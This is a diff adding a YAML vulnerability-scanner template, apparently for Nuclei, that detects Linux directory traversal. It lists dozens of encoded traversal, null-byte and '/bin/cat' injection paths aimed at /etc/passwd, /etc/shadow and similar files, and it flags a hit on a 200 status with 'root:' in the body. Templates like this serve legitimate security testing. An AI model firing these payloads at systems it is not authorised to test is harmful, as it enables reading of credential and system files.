@@ -1,0 +1,70 @@
+id: dir-traversal
+
+info:
+  name: Linux Directory Traversal
+  author: Sappy
+  severity: high
+  description: Detects basic linux based directory traversal.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+      - "{{BaseURL}}/./../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/hosts%00"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/hosts"
+      - "{{BaseURL}}/../../boot.ini"
+      - "{{BaseURL}}/../../../../../../../../%2A"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/passwd%00"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/shadow%00"
+      - "{{BaseURL}}/../../../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/../../../../../../../../../../etc/passwd^^"
+      - "{{BaseURL}}/../../../../../../../../../../etc/shadow^^"
+      - "{{BaseURL}}/../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}/../../../../../../../../../../etc/shadow"
+      - "{{BaseURL}}/./././././././././././etc/passwd"
+      - "{{BaseURL}}/./././././././././././etc/shadow"
+      - "{{BaseURL}}/%0a/bin/cat%20/etc/passwd"
+      - "{{BaseURL}}/%0a/bin/cat%20/etc/shadow"
+      - "{{BaseURL}}/%00/etc/passwd%00"
+      - "{{BaseURL}}/%00/etc/shadow%00"
+      - "{{BaseURL}}/%00../../../../../../etc/passwd"
+      - "{{BaseURL}}/%00../../../../../../etc/shadow"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd%00.jpg"
+      - "{{BaseURL}}/../../../../../../../../../../../etc/passwd%00.html"
+      - "{{BaseURL}}/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"
+      - "{{BaseURL}}/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow"
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
+      - "{{BaseURL}}%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
+      - "{{BaseURL}}//%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00"
+      - "{{BaseURL}}/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00"
+      - "{{BaseURL}}//&apos;/bin/cat%20/etc/passwd//&apos;"
+      - "{{BaseURL}}/image?filename=../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "localhost"
+        condition: or
+          
+        part: body
